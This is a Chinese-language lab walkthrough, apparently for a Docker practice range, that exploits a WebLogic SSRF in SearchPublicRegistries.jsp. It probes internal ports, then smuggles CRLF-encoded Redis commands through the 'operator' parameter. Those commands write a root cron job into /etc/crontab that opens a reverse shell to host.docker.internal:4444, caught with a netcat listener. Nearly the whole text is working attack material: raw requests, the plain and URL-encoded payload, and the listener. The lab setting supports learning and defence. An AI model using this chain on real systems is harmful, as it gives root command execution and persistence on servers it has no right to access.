先启动靶场：
```
docker compose up -d
```
启动后可以访问UDDI(服务注册中心)记录服务的地方
```
http://localhost:7001/uddiexplorer/
```
漏洞存在于 SearchPublicRegistries.jsp 页面中
先探测内网状态
用Burp suite打开，修改头文件：
```
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001 HTTP/1.1
```
当访问可用端口时（如7001）
会返回带有`did not have a valid SOAP content-type`的错误

当访问不存在的端口时（如7000）
会返回带有`could not connect over HTTP to server`的错误。

由此可以探测出内网状态
先扫描内网的Radis服务器(通常是`172.*`网段)
但我是192.168.97.2(tools里的ssrf_scan.py脚本可以扫到)
头文件如下：
```
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://192.168.97.2:6379 HTTP/1.1
```
返回
```
An error has occurred<BR>
weblogic.uddi.client.structures.exception.XML_SoapException: Received a response from url: http://192.168.97.2:6379 which did not have a valid SOAP content-type: null.
```

接下来开始发送Redis命令：
将shell脚本写入`/etc/crontab`
```
set 1 "\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i >& /dev/tcp/host.docker.internal/4444 0>&1'\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save
```

`set 1`（写内容）
`config set dir`（改存档目录）
`config set dbfilename`（改文件名）
`save`（触发存档）

然后进行URL编码
```
set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fhost.docker.internal%2F4444%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave
```
放进Burpsuite：
```
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://192.168.97.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fhost.docker.internal%2F4444%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave HTTP/1.1
```

开启监控：
```
nc -lv 4444
```
等一分钟后即可反弹shell
gg

"为什么换行能注入"（核心原理）： 
`%0D%0A`（换行符）为什么能塞进 GET 请求？
因为 SSRF 转发时不过滤换行符，而 Redis 用换行分隔命令所以 `%0D%0A` 解码成真实换行 = 给 Redis 塞了新的命令行。这是这个攻击的灵魂